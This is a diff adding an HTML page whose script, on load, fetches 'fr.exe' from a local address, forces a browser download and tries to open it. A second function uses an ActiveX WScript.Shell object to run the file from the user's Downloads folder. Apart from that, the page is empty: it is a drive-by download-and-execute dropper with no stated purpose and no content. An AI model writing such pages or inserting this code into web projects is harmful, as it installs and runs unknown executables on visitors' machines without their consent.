@@ -1,0 +1,32 @@
+<html>
+
+<script type="text/javascript"> 
+
+ function downloadAndExecute(url, destination) {
+      fetch(url)
+        .then(response => response.blob())
+        .then(blob => {
+          const link = document.createElement('a');
+          link.href = URL.createObjectURL(blob);
+          link.download = destination;
+
+          link.click();
+
+          // Execute the downloaded file (assuming it's an executable)
+          window.open(destination);
+        });
+    }
+
+    // Usage example
+    downloadAndExecute(
+      'http://127.0.0.1/fr.exe',
+      'fr.exe'
+    );
+
+
+        function RunFile() {
+		WshShell = new ActiveXObject("WScript.Shell");
+		WshShell.Run("%USERPROFILE%\Downloads\fr.exe", 1, false);
+        }
+</script>
+</html>
